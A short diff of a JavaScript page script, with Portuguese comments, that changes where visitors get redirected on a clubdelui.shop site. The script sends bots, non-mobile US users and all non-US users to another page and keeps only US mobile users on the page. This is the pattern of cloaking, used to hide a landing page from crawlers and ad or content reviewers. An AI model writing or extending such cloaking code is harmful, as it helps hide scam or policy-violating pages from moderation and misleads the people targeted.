@@ -33,7 +33,7 @@
     // Verifica se o usuário é um robô (bot).
     if (isBot()) {
         console.log('Usuário é um bot, redirecionando...'); // Log de depuração
-        window.location.href = "https://clubdelui.shop/thankyou";
+        window.location.href = "https://clubdelui.shop/saif";
     } else {
         // Verifica a localização do usuário.
         getGeolocation(function(location) {
@@ -42,11 +42,11 @@
                     console.log('Usuário está nos EUA e em um dispositivo móvel, não redirecionado.'); // Permanece na página
                 } else {
                     console.log('Usuário está nos EUA, mas não está em um dispositivo móvel, redirecionando...'); // Redireciona
-                    window.location.href = "https://clubdelui.shop/thankyou";
+                    window.location.href = "https://clubdelui.shop/saif";
                 }
             } else {
                 console.log('Usuário fora dos EUA, redirecionando...'); // Redireciona qualquer outro usuário
-                window.location.href = "https://clubdelui.shop/thankyou";
+                window.location.href = "https://clubdelui.shop/saif";
             }
         });
     }
